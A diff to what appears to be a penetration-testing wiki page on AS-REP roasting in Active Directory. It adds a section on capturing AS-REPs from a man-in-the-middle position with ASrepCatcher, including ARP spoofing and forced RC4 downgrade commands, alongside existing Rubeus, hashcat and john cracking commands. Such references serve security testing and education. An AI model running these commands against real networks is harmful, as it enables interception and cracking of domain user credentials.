@@ -52,6 +52,8 @@ Rubeus.exe asreproast  /format:hashcat /outfile:ASREProastables.txt
 {% endtab %}
 {% endtabs %}
 
+
+
 Depending on the output format used (`hashcat` or `john`), [hashcat](https://github.com/hashcat/hashcat) and [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) can be used to try [cracking the hashes](../credentials/cracking.md).
 
 ```bash
@@ -60,6 +62,21 @@ hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
 
 ```bash
 john --wordlist=$wordlist ASREProastables.txt
+```
+
+### ASREProast MitM
+
+Another way to conduct AS-REP roasting, without having to know the vulnerable users, would be to have a man-in-the-middle position on the network and catch AS-REPs. [ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher) (Python) can be used for that purpose. It also has the ability to force client workstations to use RC4 (weaker encryption type) by altering the Kerberos negotiation process. The tool natively uses ARP spoofing (which can be disabled if needed).
+
+```bash
+# Proxy between the clients and the DC, forcing RC4 downgrade if supported
+ASRepCatcher.py relay -dc $DC_IP --keep-spoofing
+
+# Disables ARP spoofing (the MitM must be obtained with other means)
+ASRepCatcher.py relay -dc $DC_IP --disable-spoofing
+
+# Passively listen for AS-REP packets, no packet alteration
+ASrepCatcher.py listen
 ```
 
 ## Resources
